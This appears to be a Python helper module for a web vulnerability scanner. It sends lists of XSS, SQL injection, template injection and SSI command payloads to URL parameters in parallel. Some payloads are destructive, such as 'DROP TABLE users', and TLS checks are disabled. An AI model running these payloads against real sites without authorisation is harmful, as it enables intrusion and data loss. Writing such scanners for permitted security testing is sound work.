"""
Utility functions for Unified Vulnerability Scanner
"""

import requests
import time
import logging
from typing import List, Dict, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import os
import sys

# Add current directory to path for local imports
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

from config import SCAN_OPTIONS

logger = logging.getLogger("unified_scanner.utils")

class HTTPClient:
    def __init__(self):
        self.timeout = SCAN_OPTIONS["timeout"]
        self.retries = SCAN_OPTIONS["retries"]
        self.user_agent = SCAN_OPTIONS["user_agent"]
        self.session = requests.Session()
        
        # Set headers to avoid blocking
        self.session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
    
    def send_request(self, url: str, payload: str, payload_type: str, param: str = "q") -> Dict[str, Any]:
        """
        Send HTTP request with payload
        
        Args:
            url: Target URL
            payload: Payload to inject
            payload_type: Type of payload ('xss' or 'sqli')
            param: Parameter name to use for injection
            
        Returns:
            Dictionary with response details
        """
        for attempt in range(self.retries + 1):
            try:
                # Add small delay to be respectful
                time.sleep(0.1)
                
                # Construct test URL with payload
                if '?' in url:
                    test_url = f"{url}&{param}={payload}"
                else:
                    test_url = f"{url}?{param}={payload}"
                
                response = self.session.get(
                    test_url, 
                    timeout=self.timeout,
                    allow_redirects=True,
                    verify=False  # Allow self-signed certificates for testing
                )
                
                return {
                    "url": test_url,
                    "original_url": url,
                    "payload": payload,
                    "payload_type": payload_type,
                    "param": param,
                    "status_code": response.status_code,
                    "response_text": response.text,
                    "response_headers": dict(response.headers),
                    "response_time": response.elapsed.total_seconds(),
                    "success": True
                }
                
            except requests.exceptions.Timeout:
                logger.warning(f"Timeout for {url} (attempt {attempt + 1})")
            except requests.exceptions.ConnectionError:
                logger.warning(f"Connection error for {url} (attempt {attempt + 1})")
            except requests.exceptions.TooManyRedirects:
                logger.warning(f"Too many redirects for {url}")
            except Exception as e:
                logger.error(f"Error sending request to {url}: {str(e)}")
            
            if attempt < self.retries:
                time.sleep(1)  # Wait before retry
        
        return {
            "url": url,
            "payload": payload,
            "payload_type": payload_type,
            "status_code": 0,
            "response_text": "",
            "response_headers": {},
            "response_time": 0,
            "success": False,
            "error": "Max retries exceeded"
        }

class PayloadGenerator:
    """Generate payloads for SQLi and XSS testing"""
    
    @staticmethod
    def get_xss_payloads() -> List[str]:
        """Return common XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<!--#exec cmd=\"id\"-->",
            "<?xml version=\"1.0\"?><foo><![CDATA[<' || 'x' || '>]]></foo>"
        ]
    
    @staticmethod
    def get_sqli_payloads() -> List[str]:
        """Return common SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--",
            "' OR 1=1--",
            "admin'--",
            "' AND 1=2 UNION SELECT 1,2,3--",
            "' AND SLEEP(5)--",
            "' OR EXISTS(SELECT * FROM information_schema.tables)--",
            "1; DROP TABLE users",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "' OR 'a'='a",
            "' OR 1=1#",
            "' OR '1'='1' /*",
            "admin' OR '1'='1"
        ]
    
    @staticmethod
    def get_test_parameters() -> List[str]:
        """Return common parameter names to test"""
        return ["id", "q", "search", "query", "name", "user", "username", "email"]

def parallel_scan(http_client: HTTPClient, url: str, payloads: List[str], payload_type: str) -> List[Dict[str, Any]]:
    """
    Scan a URL with multiple payloads in parallel
    
    Args:
        http_client: HTTP client instance
        url: Target URL
        payloads: List of payloads to test
        payload_type: Type of payloads ('xss' or 'sqli')
        
    Returns:
        List of response results
    """
    results = []
    max_payloads = min(len(payloads), SCAN_OPTIONS["max_payloads_per_type"])
    test_payloads = payloads[:max_payloads]
    
    logger.info(f"Testing {len(test_payloads)} {payload_type.upper()} payloads on {url}")
    
    with ThreadPoolExecutor(max_workers=SCAN_OPTIONS["max_workers"]) as executor:
        future_to_payload = {
            executor.submit(http_client.send_request, url, payload, payload_type): payload 
            for payload in test_payloads
        }
        
        for future in as_completed(future_to_payload):
            payload = future_to_payload[future]
            try:
                result = future.result()
                results.append(result)
                
                if result["success"]:
                    logger.debug(f"Payload tested: {payload[:50]}... → Status: {result['status_code']}")
                else:
                    logger.warning(f"Payload failed: {payload[:50]}... → Error: {result.get('error', 'Unknown')}")
                    
            except Exception as e:
                logger.error(f"Error processing payload {payload}: {str(e)}")
                results.append({
                    "url": url,
                    "payload": payload,
                    "payload_type": payload_type,
                    "success": False,
                    "error": str(e)
                })
    
    successful_scans = sum(1 for r in results if r.get("success", False))
    logger.info(f"Completed {successful_scans}/{len(test_payloads)} successful {payload_type.upper()} scans for {url}")
    
    return results

def setup_logging():
    """Setup logging configuration"""
    import logging.config
    from config import LOG_CONFIG
    logging.config.dictConfig(LOG_CONFIG)